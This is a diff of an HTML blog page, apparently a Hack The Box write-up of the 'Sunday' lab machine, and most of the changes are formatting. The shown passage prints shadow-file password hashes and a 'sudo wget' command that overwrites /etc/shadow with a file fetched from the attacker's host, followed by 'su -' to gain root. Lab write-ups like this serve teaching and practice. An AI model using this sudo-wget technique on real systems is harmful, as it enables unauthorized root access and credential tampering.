-nobody4:*LK*:6445::::::
-sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
-sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
-</code></pre><p>Serve this file with <code>python -m SimpleHTTPServer 8000</code> and then download it
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</span></span><span style="display:flex;"><span>mysql:NP:::::::
+</span></span><span style="display:flex;"><span>openldap:*LK*:::::::
+</span></span><span style="display:flex;"><span>webservd:*LK*:::::::
+</span></span><span style="display:flex;"><span>postgres:NP:::::::
+</span></span><span style="display:flex;"><span>svctag:*LK*:6445::::::
+</span></span><span style="display:flex;"><span>nobody:*LK*:6445::::::
+</span></span><span style="display:flex;"><span>noaccess:*LK*:6445::::::
+</span></span><span style="display:flex;"><span>nobody4:*LK*:6445::::::
+</span></span><span style="display:flex;"><span>sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+</span></span><span style="display:flex;"><span>sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</span></span></code></pre></div><p>Serve this file with <code>python -m SimpleHTTPServer 8000</code> and then download it
 with sudo as sammy:</p>
-<pre><code class="language-console" data-lang="console">sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.15.130:8000/shadow
---17:31:08--  http://10.10.15.130:8000/shadow
-           =&gt; `/etc/shadow'
-Connecting to 10.10.15.130:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 392 [application/octet-stream]
-
-100%[==================================================================================================================&gt;] 392           --.--K/s
-
-17:31:08 (60.37 MB/s) - `/etc/shadow' saved [392/392]
-</code></pre><p>Now, a simple <code>su -</code> followed by password &ldquo;sunday&rdquo; is enough to become root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.15.130:8000/shadow
+</span></span><span style="display:flex;"><span>--17:31:08--  http://10.10.15.130:8000/shadow
+</span></span><span style="display:flex;"><span>           =&gt; `/etc/shadow&#39;
+</span></span><span style="display:flex;"><span>Connecting to 10.10.15.130:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... 200 OK
+</span></span><span style="display:flex;"><span>Length: 392 [application/octet-stream]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>100%[==================================================================================================================&gt;] 392           --.--K/s
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>17:31:08 (60.37 MB/s) - `/etc/shadow&#39; saved [392/392]
+</span></span></code></pre></div><p>Now, a simple <code>su -</code> followed by password &ldquo;sunday&rdquo; is enough to become root.</p>
 <h1 id="conclusion">Conclusion</h1>
 <p>Very nice box with a few brute-forcing challenges and a basic privesc. Nice to
 see an old-school OS, feels very retro :)</p>
@@ -595,7 +591,7 @@ web server, so combined with sudo you can just send the flag to yourself.</li>
       by <span itemprop="author">Dominic Breuker</span>
     
   
-  <time itemprop="datePublished" datetime="2018-09-30T00:00:00&#43;02:00">
+  <time itemprop="datePublished" datetime="2018-09-30T00:00:00&#43;00:00">
     30 Sep, 2018
   </time>
   
@@ -618,7 +614,7 @@ web server, so combined with sudo you can just send the flag to yourself.</li>
         <time datetime="12M">12 minutes</time>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="10M">10 minutes</time>
+        <time datetime="9M">9 minutes</time>
       
         <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
         <time datetime="8M">8 minutes</time>
